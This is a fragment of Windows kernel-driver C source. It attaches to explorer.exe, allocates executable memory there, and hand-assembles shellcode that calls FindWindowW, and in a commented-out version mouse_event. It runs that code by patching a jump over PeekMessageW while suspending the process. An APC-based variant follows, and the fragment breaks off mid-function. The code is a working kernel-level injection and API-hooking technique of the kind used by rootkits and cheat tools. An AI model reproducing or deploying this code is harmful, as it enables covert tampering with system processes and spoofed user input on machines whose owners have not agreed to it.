			RtlCopyMemory(pCode, xmm0_15, sizeof(xmm0_15));
			pCode += sizeof(xmm0_15);

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xBA;
			LOG_DEBUG("< %p >\n", ExeCode);
			*((DWORD64*)&pCode[2]) = (DWORD64)pUserWindowsName;
			LOG_DEBUG("< %p >\n", ExeCode);
			pCode += 10;

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB9;
			*((DWORD64*)&pCode[2]) = (DWORD64)Hwnd;
			pCode += 10;

			pCode[0] = (char)0xFF;
			pCode[1] = (char)0x15;
			*((DWORD*)&pCode[2]) =  (DWORD)((INT64)pFun - (INT64)pCode - 6);
			pCode += 6;

			pCode[0] = (char)0xA3;
			*((DWORD64*)&pCode[1]) = (DWORD64)pHwnd;
			pCode += 9;

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)xmmCode;
			pCode += 10;

			RtlCopyMemory(pCode, xmm0_15_r, sizeof(xmm0_15_r));
			pCode += sizeof(xmm0_15_r);

			RtlCopyMemory(pCode, PopAll, sizeof(PopAll));
			pCode += sizeof(PopAll);

			RtlCopyMemory(pCode, BeginPeek, sizeof(BeginPeek));
			pCode += sizeof(BeginPeek);



			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)nExeSucess;
			pCode += 10;

			pCode[0] = (char)0xC7;
			pCode[1] = (char)0x00;
			*((DWORD*)&pCode[2]) = 1;
			pCode += 6;


			//nExeSucess = pCode + 3;


			pCode[0] = (char)0x48;
			pCode[1] = (char)0xFF;
			pCode[2] = (char)0x25;
			*((DWORD*)&pCode[3]) = 0;
			*((DWORD64*)&pCode[7]) = PeekMessageW + 15;

			//pCode[0] = (char)0xC3;
			LOG_DEBUG("< %p >\n", addr);
			//RtlCopyMemory(ExeCode, Buffer, 0x200);



			char JMP_NEW[15] = { 0 };

			JMP_NEW[0] = (char)0x48;
			JMP_NEW[1] = (char)0xFF;
			JMP_NEW[2] = (char)0x25;

			*((DWORD*)&JMP_NEW[3]) = 0;
			*((DWORD64*)&JMP_NEW[7]) = (DWORD64)ExeCode;





			HANDLE  tid = GetPrccessFirstThreadID(eprocess);
			LOG_DEBUG("Thread ID:<%p>\n", tid);
			PETHREAD Ethread = 0;
			if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
			{
				PsSuspendProcess(eprocess);
				PETHREAD ArryEthread[256] = { 0 };
				BOOLEAN nKeg = 1;
				CONTEXT* pConText = (CONTEXT*)(_Begin + 0x1800);
				ULONG nSize = 0x10;
				ULONG uProtect = 0;
				while (nKeg)
				{
					int tSize = EnumProcessThread(eprocess, ArryEthread);
					for (size_t i = 0; i < tSize; i++)
					{
						NTSTATUS status = PsGetContextThread(ArryEthread[i], pConText, UserMode);
						if (pConText->Rip >= PeekMessageW && pConText->Rip < (PeekMessageW + 10))
						{
							break;
						}
						nKeg = 0;
					}
					if (nKeg)
					{
						PsResumeProcess(eprocess);
						wSleepNs(1000);
						PsSuspendProcess(eprocess);
						continue;
					}
					//writeSafeMemory(PeekMessageW, JMP_NEW, sizeof(JMP_NEW));

					DWORD64 gzPeekMessageW = PeekMessageW;

					ULONGLONG nSize = 0x10;
					ULONG uProtect = 0;

					if (!NT_SUCCESS(ZwProtectVirtualMemory(ZwCurrentProcess(), (PVOID *)&gzPeekMessageW, &nSize, PAGE_EXECUTE_READWRITE, &uProtect)))
					{
						//ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_DECOMMIT);
						KeUnstackDetachProcess(&Apc_State);
						ObDereferenceObject(Ethread);
						ObDereferenceObject(eprocess);
						return 2;
					}
					//pHyAddress = MmGetPhysicalAddress(PeekMessageW);
					//LOG_DEBUG("pHyAddress <%p>\n", pHyAddress.QuadPart);

					RtlCopyMemory((PVOID)PeekMessageW, JMP_NEW, sizeof(JMP_NEW));
					//writeSafeMemory(PeekMessageW, JMP_NEW, sizeof(JMP_NEW));
					break;
				}
				PsResumeProcess(eprocess);

				while (*nExeSucess != 1) {
					wSleepNs(1);
				}

				PsSuspendProcess(eprocess);
				nKeg = 1;
				while (nKeg)
				{
					int tSize = EnumProcessThread(eprocess, ArryEthread);
					for (size_t i = 0; i < tSize; i++)
					{
						NTSTATUS status = PsGetContextThread(ArryEthread[i], pConText, UserMode);
						if (pConText->Rip >= PeekMessageW && pConText->Rip < (PeekMessageW + 10))
						{
							break;
						}
						nKeg = 0;
					}
					if (nKeg)
					{
						PsResumeProcess(eprocess);
						wSleepNs(1000);
						PsSuspendProcess(eprocess);
						continue;
					}
					RtlCopyMemory((PVOID)PeekMessageW, BeginPeek, sizeof(BeginPeek));
					//writeSafeMemory(PeekMessageW, BeginPeek, sizeof(BeginPeek));
					break;
				}
				PsResumeProcess(eprocess);
				ObDereferenceObject(Ethread);
			}


			RtlCopyMemory(lpRect, pUserWindowsName, sizeof(RECTK));
			LOG_DEBUG("< lpRect  x %d  y %d t %d b %d  >\n", lpRect->left, lpRect->right, lpRect->top, lpRect->bottom);
			//ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_DECOMMIT);
			ExChangeMem(0, &mMemory, dwPID_Explorer);
			KeUnstackDetachProcess(&Apc_State);
			ObDereferenceObject(eprocess);
			return 0;

		}
		KeUnstackDetachProcess(&Apc_State);
		ObDereferenceObject(eprocess);
		return 3;
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return 4;
}

HWND  FindWindowW_User(PUNICODE_STRING lpClassName, PUNICODE_STRING lpWindowName)
{
	HWND Hwnd = 0;
	PEPROCESS eprocess;
	HANDLE dwPID_Explorer = Get_Win32k_Process_Explorer();
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		KAPC_STATE Apc_State;
		KeStackAttachProcess(eprocess, &Apc_State);

		MEM_LIST_PID mMemory = { 0 };
		PVOID addr = 0;
		if (ExChangeMem(1, &mMemory, dwPID_Explorer) == 0) {
			size_t size = PAGE_SIZE * 2;
			NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!NT_SUCCESS(status)) {

				KeUnstackDetachProcess(&Apc_State);
				ObDereferenceObject(eprocess);
				return 0;
			}
			mMemory.addr = addr;
			mMemory.dwPID = dwPID_Explorer;
			mMemory.size = size;
		}
		else {
			addr = mMemory.addr;
			RtlZeroMemory(addr, mMemory.size);
		}

		char* ExeCode = 0;
		DWORD* nExeSucess = 0;
		char BeginPeek[] = { 0x48, 0x89, 0x5C , 0x24 , 0x08 , 0x48 , 0x89 , 0x6C , 0x24 , 0x10 , 0x48 , 0x89 , 0x74 , 0x24 , 0x18 };
		if (addr != 0)
		{

			LOG_DEBUG("< %p >\n", addr);

			RtlZeroMemory(addr, PAGE_SIZE * 2);
			char* _Begin = (char*)addr;

			wchar_t* pUserClassName = (wchar_t*)_Begin;
			wchar_t* pUserWindowsName = (wchar_t*)(_Begin + 0x200);
			LOG_DEBUG("< %p >\n", addr);
			RtlCopyMemory(pUserClassName, lpClassName->Buffer, lpClassName->Length);
			LOG_DEBUG("< %p >\n", addr);
			RtlCopyMemory(pUserWindowsName, lpWindowName->Buffer, lpWindowName->Length);
			LOG_DEBUG("< %p >\n", addr);
			HWND* pHwnd = (HWND *)(_Begin + 0x400);

			nExeSucess = (DWORD *)(_Begin + 0x500);

			char* pFun = _Begin + 0x600;

			DWORD64 _bFindWindowW = 0;

			DWORD64 PeekMessageW = 0;




			if (mMemory._FindWindowW == 0)
			{
				UNICODE_STRING uUser32;
				RtlInitUnicodeString(&uUser32, L"user32.dll");
				DWORD64 Mod_User32 = GetModuleBaseWow64_Self(uUser32);
				if (Mod_User32 != 0)
				{
					_bFindWindowW = (DWORD64)GetProcAddress_Kernel((PVOID)Mod_User32, "FindWindowW");
					LOG_DEBUG(" _bFindWindowW <%p>\n", _bFindWindowW);

					PeekMessageW = (DWORD64)GetProcAddress_Kernel((PVOID)Mod_User32, "PeekMessageW");

					LOG_DEBUG(" PeekMessageW <%p>\n", _bFindWindowW);

					mMemory._FindWindowW = _bFindWindowW;
					mMemory._PeekMessageW = PeekMessageW;





				}
			}
			else
			{
				_bFindWindowW = mMemory._FindWindowW;
				PeekMessageW = mMemory._PeekMessageW;
			}




			if (_bFindWindowW == 0 || PeekMessageW == 0)
			{
				LOG_DEBUG("Err _bFindWindowW<%p>  PeekMessageW <%p>\n", _bFindWindowW, PeekMessageW);
				KeUnstackDetachProcess(&Apc_State);
				ObDereferenceObject(eprocess);
				return 0;
			}




			*((DWORD64*)pFun) = _bFindWindowW;
			ExeCode = _Begin + 0x800;

			char* xmmCode = _Begin + PAGE_SIZE;

			LOG_DEBUG("< %p >\n", ExeCode);

			//char Buffer[0x200] = {0};
			char* pCode = ExeCode;


			//MAKE_BEGIN

			RtlCopyMemory(pCode, PushAll, sizeof(PushAll));
			pCode += sizeof(PushAll);

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)xmmCode;
			pCode += 10;

			RtlCopyMemory(pCode, xmm0_15, sizeof(xmm0_15));
			pCode += sizeof(xmm0_15);

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xBA;
			LOG_DEBUG("< %p >\n", ExeCode);
			*((DWORD64*)&pCode[2]) = (DWORD64)pUserWindowsName;
			LOG_DEBUG("< %p >\n", ExeCode);
			pCode += 10;

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB9;
			*((DWORD64*)&pCode[2]) = (DWORD64)pUserClassName;
			pCode += 10;

			pCode[0] = (char)0xFF;
			pCode[1] = (char)0x15;
			*((DWORD*)&pCode[2]) =  (DWORD)((INT64)pFun - (INT64)pCode - 6);
			pCode += 6;

			pCode[0] = (char)0xA3;
			*((DWORD64*)&pCode[1]) = (DWORD64)pHwnd;
			pCode += 9;

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)xmmCode;
			pCode += 10;

			RtlCopyMemory(pCode, xmm0_15_r, sizeof(xmm0_15_r));
			pCode += sizeof(xmm0_15_r);

			RtlCopyMemory(pCode, PopAll, sizeof(PopAll));
			pCode += sizeof(PopAll);

			RtlCopyMemory(pCode, BeginPeek, sizeof(BeginPeek));
			pCode += sizeof(BeginPeek);



			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)nExeSucess;
			pCode += 10;

			pCode[0] = (char)0xC7;
			pCode[1] = (char)0x00;
			*((DWORD*)&pCode[2]) = 1;
			pCode += 6;


			//nExeSucess = pCode + 3;


			pCode[0] = (char)0x48;
			pCode[1] = (char)0xFF;
			pCode[2] = (char)0x25;
			*((DWORD*)&pCode[3]) = 0;
			*((DWORD64*)&pCode[7]) = PeekMessageW + 15;

			//pCode[0] = (char)0xC3;
			LOG_DEBUG("< %p >\n", addr);
			//RtlCopyMemory(ExeCode, Buffer, 0x200);



			char JMP_NEW[15] = { 0 };

			JMP_NEW[0] = (char)0x48;
			JMP_NEW[1] = (char)0xFF;
			JMP_NEW[2] = (char)0x25;

			*((DWORD*)&JMP_NEW[3]) = 0;
			*((DWORD64*)&JMP_NEW[7]) = (DWORD64)ExeCode;

			HANDLE  tid = GetPrccessFirstThreadID(eprocess);
			LOG_DEBUG("Thread ID:<%p>\n", tid);
			PETHREAD Ethread = 0;
			if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
			{
				PsSuspendProcess(eprocess);
				PETHREAD ArryEthread[256] = { 0 };
				BOOLEAN nKeg = 1;
				CONTEXT* pConText = (CONTEXT*)(_Begin + 0x1800);
				ULONG nSize = 0x10;
				ULONG uProtect = 0;
				while (nKeg)
				{
					int tSize = EnumProcessThread(eprocess, ArryEthread);
					for (size_t i = 0; i < tSize; i++)
					{
						NTSTATUS status = PsGetContextThread(ArryEthread[i], pConText, UserMode);
						if (pConText->Rip >= PeekMessageW && pConText->Rip < (PeekMessageW + 10))
						{
							break;
						}
						nKeg = 0;
					}
					if (nKeg)
					{
						PsResumeProcess(eprocess);
						wSleepNs(1000);
						PsSuspendProcess(eprocess);
						continue;
					}
					//writeSafeMemory(PeekMessageW, JMP_NEW, sizeof(JMP_NEW));

					DWORD64 gzPeekMessageW = PeekMessageW;

					ULONGLONG nSize = 0x10;
					ULONG uProtect = 0;

					//PHYSICAL_ADDRESS pHyAddress = MmGetPhysicalAddress(PeekMessageW);
					//LOG_DEBUG("pHyAddress <%p>\n", pHyAddress.QuadPart);
					if (!NT_SUCCESS(ZwProtectVirtualMemory(ZwCurrentProcess(), (PVOID *)&gzPeekMessageW, &nSize, PAGE_EXECUTE_READWRITE, &uProtect)))
					{
						//ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_DECOMMIT);
						KeUnstackDetachProcess(&Apc_State);
						ObDereferenceObject(Ethread);
						ObDereferenceObject(eprocess);
						return 0;
					}
					//pHyAddress = MmGetPhysicalAddress(PeekMessageW);
					//LOG_DEBUG("pHyAddress <%p>\n", pHyAddress.QuadPart);
					//writeSafeMemory(PeekMessageW, JMP_NEW, sizeof(JMP_NEW));
					RtlCopyMemory((PVOID)PeekMessageW, JMP_NEW, sizeof(JMP_NEW));
					break;
				}
				PsResumeProcess(eprocess);

				while (*nExeSucess != 1) {
					wSleepNs(1);
				}

				PsSuspendProcess(eprocess);
				nKeg = 1;
				while (nKeg)
				{
					int tSize = EnumProcessThread(eprocess, ArryEthread);
					for (size_t i = 0; i < tSize; i++)
					{
						NTSTATUS status = PsGetContextThread(ArryEthread[i], pConText, UserMode);
						if (pConText->Rip >= PeekMessageW && pConText->Rip < (PeekMessageW + 10))
						{
							break;
						}
						nKeg = 0;
					}
					if (nKeg)
					{
						PsResumeProcess(eprocess);
						wSleepNs(1000);
						PsSuspendProcess(eprocess);
						continue;
					}
					RtlCopyMemory((PVOID)PeekMessageW, BeginPeek, sizeof(BeginPeek));
					//writeSafeMemory(PeekMessageW, BeginPeek, sizeof(BeginPeek));
					break;
				}
				PsResumeProcess(eprocess);
				ObDereferenceObject(Ethread);
			}

			//wSleepNs(1000);

			Hwnd = *pHwnd;

			LOG_DEBUG("< Hwnd %08X >\n", *pHwnd);
			//ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_DECOMMIT);
			ExChangeMem(0, &mMemory, dwPID_Explorer);
		}
		LOG_DEBUG("< %p >\n", addr);
		KeUnstackDetachProcess(&Apc_State);
		ObDereferenceObject(eprocess);
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	//}
	return Hwnd;
}

//void  mouse_event2(MOUSE_EVENT* pMouseEvent)
//{
//
//	//sizeof(RAWINPUT)
//
//	//RAWINPUT
//
//		//sizeof(RAWMOUSE)
//
//	PEPROCESS eprocess;
//	HANDLE dwPID_Explorer = Get_Win32k_Process_Explorer();
//	if (!NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {
//		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
//		return;
//	}
//	KAPC_STATE Apc_State;
//	KeStackAttachProcess(eprocess, &Apc_State);
//
//	MEM_LIST_PID mMemory = { 0 };
//	PVOID addr = 0;
//	if (ExChangeMem(1, &mMemory, dwPID_Explorer) == 0) {
//		size_t size = PAGE_SIZE * 2;
//		NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//		if (!NT_SUCCESS(status)) {
//			KeUnstackDetachProcess(&Apc_State);
//			ObDereferenceObject(eprocess);
//			return;
//		}
//		mMemory.addr = addr;
//		mMemory.dwPID = dwPID_Explorer;
//		mMemory.size = size;
//	}
//	else {
//		addr = mMemory.addr;
//		RtlZeroMemory(addr, mMemory.size);
//	}
//
//	char* ExeCode = 0;
//	DWORD* nExeSucess = 0;
//	char BeginPeek[] = { 0x48, 0x89, 0x5C , 0x24 , 0x08 , 0x48 , 0x89 , 0x6C , 0x24 , 0x10 , 0x48 , 0x89 , 0x74 , 0x24 , 0x18 };
//	if (addr != 0)
//	{
//
//		LOG_DEBUG("< %p >\n", addr);
//
//		RtlZeroMemory(addr, PAGE_SIZE * 2);
//		char* _Begin = (char*)addr;
//
//		wchar_t* pUserClassName = _Begin;
//		//wchar_t* pUserWindowsName = _Begin + 0x200;
//
//		HWND* pHwnd = _Begin + 0x400;
//
//		nExeSucess = _Begin + 0x500;
//
//		char* pFun = _Begin + 0x600;
//
//		DWORD64 f_mouse_event = 0;
//
//		DWORD64 PeekMessageW = 0;
//
//
//		if (mMemory._MouseEvent == 0)
//		{
//			UNICODE_STRING uUser32;
//			RtlInitUnicodeString(&uUser32, L"user32.dll");
//			DWORD64 Mod_User32 = GetModuleBaseWow64_Self(uUser32);
//			if (Mod_User32 != 0) {
//				f_mouse_event = GetProcAddress_Kernel(Mod_User32, "mouse_event");
//				PeekMessageW = GetProcAddress_Kernel(Mod_User32, "PeekMessageW");
//
//				mMemory._MouseEvent = f_mouse_event;
//				mMemory._PeekMessageW = PeekMessageW;
//
//
//			}
//		}
//		else
//		{
//			f_mouse_event = mMemory._MouseEvent;
//			PeekMessageW = mMemory._PeekMessageW;
//		}
//
//
//		if (f_mouse_event == 0 || PeekMessageW == 0)
//		{
//			LOG_DEBUG("Err MouseEvent<%p>  PeekMessageW <%p>\n", f_mouse_event, PeekMessageW);
//			ExChangeMem(0, &mMemory, dwPID_Explorer);
//			KeUnstackDetachProcess(&Apc_State);
//			ObDereferenceObject(eprocess);
//			return;
//		}
//
//
//
//		//LOG_DEBUG("MouseEvent<%p>  PeekMessageW <%p>\n", f_mouse_event, PeekMessageW);
//
//
//		*((DWORD64*)pFun) = f_mouse_event;
//		ExeCode = _Begin + 0x800;
//		char* xmmCode = _Begin + PAGE_SIZE;
//		//LOG_DEBUG("< %p >\n", ExeCode);
//		//char Buffer[0x200] = {0};
//		char* pCode = ExeCode;
//
//
//		//MAKE_BEGIN
//
//		RtlCopyMemory(pCode, PushAll, sizeof(PushAll));
//		pCode += sizeof(PushAll);
//
//		pCode[0] = (char)0x48;
//		pCode[1] = (char)0xB8;
//		*((DWORD64*)&pCode[2]) = (DWORD64)xmmCode;
//		pCode += 10;
//
//		RtlCopyMemory(pCode, xmm0_15, sizeof(xmm0_15));
//		pCode += sizeof(xmm0_15);
//
//		pCode[0] = (char)0x66;
//		pCode[1] = (char)0x9C;
//		pCode += 2;
//
//
//
//		//----------------------------------------
//		pCode[0] = (char)0x48;
//		pCode[1] = (char)0xB8;
//		*((DWORD64*)&pCode[2]) = (DWORD64)nExeSucess;
//		pCode += 10;
//
//		pCode[0] = (char)0x83;
//		pCode[1] = (char)0x38;
//		pCode[2] = (char)0x01;
//		pCode += 3;
//
//
//		pCode[0] = (char)0x0F;
//		pCode[1] = (char)0x84;
//		char* Jeoffset = &pCode[2];
//		pCode += 6;
//
//		pCode[0] = (char)0x48;
//		pCode[1] = (char)0x83;
//		pCode[2] = (char)0xEC;
//		pCode[3] = (char)0x48;
//		pCode += 4;
//
//		pCode[0] = (char)0xC7;
//		pCode[1] = (char)0x44;
//		pCode[2] = (char)0x24;
//		pCode[3] = (char)0x20;
//		*((DWORD*)&pCode[4]) = pMouseEvent->dwExtraInfo;
//		pCode += 8;
//
//
//		pCode[0] = (char)0x49; /// MOV r9
//		pCode[1] = (char)0xB9;
//		*((DWORD64*)&pCode[2]) = (DWORD64)pMouseEvent->dwData;
//		pCode += 10;
//
//		pCode[0] = (char)0x49; /// MOV r8
//		pCode[1] = (char)0xB8;
//		*((DWORD64*)&pCode[2]) = (DWORD64)pMouseEvent->dy;
//		pCode += 10;
//
//		pCode[0] = (char)0x48; /// MOV RDX
//		pCode[1] = (char)0xBA;
//		*((DWORD64*)&pCode[2]) = (DWORD64)pMouseEvent->dx;
//		pCode += 10;
//
//		pCode[0] = (char)0x48; // MOV RCX
//		pCode[1] = (char)0xB9;
//		*((DWORD64*)&pCode[2]) = (DWORD64)pMouseEvent->dwFlags;
//		pCode += 10;
//
//		pCode[0] = (char)0xFF;
//		pCode[1] = (char)0x15;
//		*((DWORD*)&pCode[2]) = (INT64)pFun - (INT64)pCode - 6;
//		pCode += 6;
//
//		pCode[0] = (char)0xA3;
//		*((DWORD64*)&pCode[1]) = pHwnd;
//		pCode += 9;
//
//		pCode[0] = (char)0x48;
//		pCode[1] = (char)0x83;
//		pCode[2] = (char)0xC4;
//		pCode[3] = (char)0x48;
//		pCode += 4;
//
//
//		char* JeCode = pCode;
//		//-------------    这是跳转CALL
//		*((DWORD*)Jeoffset) = JeCode - Jeoffset - 4;
//
//
//		pCode[0] = (char)0x66;
//		pCode[1] = (char)0x9D;
//		pCode += 2;
//
//
//		pCode[0] = (char)0x48;
//		pCode[1] = (char)0xB8;
//		*((DWORD64*)&pCode[2]) = (DWORD64)xmmCode; // MOV RAX,
//		pCode += 10;
//
//		RtlCopyMemory(pCode, xmm0_15_r, sizeof(xmm0_15_r));
//		pCode += sizeof(xmm0_15_r);
//
//		RtlCopyMemory(pCode, PopAll, sizeof(PopAll));
//		pCode += sizeof(PopAll);
//
//		RtlCopyMemory(pCode, BeginPeek, sizeof(BeginPeek));
//		pCode += sizeof(BeginPeek);
//
//		pCode[0] = (char)0x48;
//		pCode[1] = (char)0xB8;
//		*((DWORD64*)&pCode[2]) = (DWORD64)nExeSucess;
//		pCode += 10;
//
//		pCode[0] = (char)0xC7;
//		pCode[1] = (char)0x00;
//		*((DWORD*)&pCode[2]) = 1;
//		pCode += 6;
//
//
//		//nExeSucess = pCode + 3;
//		pCode[0] = (char)0x48;
//		pCode[1] = (char)0xFF;
//		pCode[2] = (char)0x25;
//		*((DWORD*)&pCode[3]) = 0;
//		*((DWORD64*)&pCode[7]) = PeekMessageW + 15;
//
//		//pCode[0] = (char)0xC3;
//		//LOG_DEBUG("< %p >\n", addr);
//		//RtlCopyMemory(ExeCode, Buffer, 0x200);
//
//
//
//		char JMP_NEW[15] = { 0 };
//
//		JMP_NEW[0] = (char)0x48;
//		JMP_NEW[1] = (char)0xFF;
//		JMP_NEW[2] = (char)0x25;
//
//		*((DWORD*)&JMP_NEW[3]) = 0;
//		*((DWORD64*)&JMP_NEW[7]) = ExeCode;
//
//
//		//PsSuspendProcess(eprocess);
//		//PETHREAD ArryEthread[256] = { 0 };
//		//BOOLEAN nKeg = 1;
//		//CONTEXT* pConText = _Begin + 0x1800;
//
//		//while (nKeg)
//		//{
//		//	int tSize = EnumProcessThread(eprocess, ArryEthread);
//		//	for (size_t i = 0; i < tSize; i++)
//		//	{
//		//		NTSTATUS status = PsGetContextThread(ArryEthread[i], pConText, UserMode);
//		//		if (pConText->Rip >= PeekMessageW && pConText->Rip < (PeekMessageW + 10))
//		//		{
//		//			break;
//		//		}
//		//		nKeg = 0;
//		//	}
//		//	if (nKeg)
//		//	{
//		//		PsResumeProcess(eprocess);
//		//		wSleepNs(1000);
//		//		PsSuspendProcess(eprocess);
//		//		continue;
//		//	}
//
//
//
//		if (TruePspCreateThread == 0)
//		{
//			DWORD64 gzPeekMessageW = PeekMessageW;
//
//			ULONGLONG nSize = 0x10;
//			ULONGLONG uProtect = 0;
//			NTSTATUS statusV = ZwProtectVirtualMemory(ZwCurrentProcess(), &gzPeekMessageW, &nSize, PAGE_EXECUTE_READWRITE, &uProtect);
//			if (!(NT_SUCCESS(statusV)))
//			{
//				LOG_DEBUG("ZwProtectVirtualMemory Error %08X\n", statusV);
//				//ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
//				ExChangeMem(0, &mMemory, dwPID_Explorer);
//				KeUnstackDetachProcess(&Apc_State);
//				ObDereferenceObject(eprocess);
//				return;
//			}
//			//char BufferV[0x10] = { 0 };
//			//RtlCopyMemory(BufferV, PeekMessageW, 0x10);
//			//PHYSICAL_ADDRESS pHyAddress = MmGetPhysicalAddress(PeekMessageW);
//			//LOG_DEBUG("pHyAddress <%p>\n", pHyAddress.QuadPart);
//			RtlCopyMemory(PeekMessageW, JMP_NEW, sizeof(JMP_NEW));
//			//writeSafeMemory(PeekMessageW, JMP_NEW, sizeof(JMP_NEW));
//		//	break;
//		//}
//		//PsResumeProcess(eprocess);
//
//
//		//Win32k_NtUserPostMessage(0, 0xF, 0, 0);
//			while (*nExeSucess != 1) {
//				wSleepNs(1);
//			}
//
//			/*	PsSuspendProcess(eprocess);
//				nKeg = 1;
//				while (nKeg)
//				{
//					int tSize = EnumProcessThread(eprocess, ArryEthread);
//					for (size_t i = 0; i < tSize; i++)
//					{
//						NTSTATUS status = PsGetContextThread(ArryEthread[i], pConText, UserMode);
//						if (pConText->Rip >= PeekMessageW && pConText->Rip < (PeekMessageW + 10))
//						{
//							break;
//						}
//						nKeg = 0;
//					}
//					if (nKeg)
//					{
//						PsResumeProcess(eprocess);
//						wSleepNs(1000);
//						PsSuspendProcess(eprocess);
//						continue;
//					}*/
//			RtlCopyMemory(PeekMessageW, BeginPeek, sizeof(BeginPeek));
//			//writeSafeMemory(PeekMessageW, BeginPeek, sizeof(BeginPeek));
//		//	break;
//		//}
//		//PsResumeProcess(eprocess);
//
//
//			LOG_DEBUG("< %p >\n", addr);
//			ExChangeMem(0, &mMemory, dwPID_Explorer);
//			//ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
//		}
//		else
//		{
//			//HANDLE tHandle = 0;
//
//			//TruePspCreateThread(&tHandle,THREAD_ALL_ACCESS,)
//
//			//while (*nExeSucess != 1) {
//			//	wSleepNs(1);
//			//}
//		}
//
//
//	}
//	//LOG_DEBUG("< %p >\n", addr);
//	KeUnstackDetachProcess(&Apc_State);
//	ObDereferenceObject(eprocess);
//}


#define USE_APC


#ifdef USE_APC



UINT  ClientToScreen_Kernel(HWND Hwnd, LPPOINT lpPoint)
{
	//HWND Hwnd = 0;
	//if (Win32k_NtUserFindWindowEx != 0) {


	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		LOG_DEBUG("Thread ID:<%p>\n", tid);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{

			RUN_APC_ARG Arg = { 0 };
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_ClientToSccreen;
			Arg.P.x = lpPoint->x;
			Arg.P.y = lpPoint->y;
			Arg.Hwnd = Hwnd;
			//LOG_DEBUG("Apc_Arg ID:<%p>\n", Apc_Arg);
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
			//LOG_DEBUG("Hwnd x %d y %d\n", lpPoint->x, lpPoint->y);
			*lpPoint = Arg.P;
			//LOG_DEBUG("Hwnd x %d y %d\n", lpPoint->x, lpPoint->y);
		}
		ObDereferenceObject(eprocess);
	}
	else
	{

		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	//}
	return 0;
}

HWND  FindWindowW(PUNICODE_STRING lpClassName, PUNICODE_STRING lpWindowName)
{
	//sizeof(PushAll);
	//EnterCrit()

	HWND Hwnd = 0;
	//if (Win32k_NtUserFindWindowEx != 0) {


	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		HANDLE  tid = GetPrccessFirstThreadID(eprocess);
		LOG_DEBUG("Thread ID:<%p>\n", tid);
		PETHREAD Ethread = 0;
		if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
		{

			RUN_APC_ARG Arg = { 0 };
			KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
			Arg.Type = ARG_NtUserFindWindowEx;
			Arg.lpClassName = lpClassName;
			Arg.lpWindowName = lpWindowName;
			//LOG_DEBUG("Apc_Arg ID:<%p>\n", Apc_Arg);
			KAPC Apc;
			KeInitializeApc(&Apc, Ethread, 0, (PKKERNEL_ROUTINE)RunApc, 0, (PKNORMAL_ROUTINE)nothing, KernelMode, 0);
			KeInsertQueueApc(&Apc, &Arg, &Arg, 0);
			KeWaitForSingleObject(&Arg.Notify, Executive, KernelMode, TRUE, NULL);
			ObDereferenceObject(Ethread);
			Hwnd = Arg.Hwnd;
			LOG_DEBUG("Hwnd ID:%08X\n", Hwnd);
		}
		ObDereferenceObject(eprocess);
	}
	else
	{

		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	//}
	return Hwnd;
}

HWND  GetForegroundWindow()
{
	HWND Hwnd = 0;
	if (Win32k_NtUserGetForegroundWindow != 0) {

		PEPROCESS eprocess;
		if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

			HANDLE  tid = GetPrccessFirstThreadID(eprocess);
			LOG_DEBUG("Thread ID:%d\n", tid);
			PETHREAD Ethread = 0;
			if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
			{

				RUN_APC_ARG Arg = { 0 };
				KeInitializeEvent(&Arg.Notify, SynchronizationEvent, FALSE);
				Arg.Type = ARG_NtUserGetForegroundWindow;
				KAPC Apc;
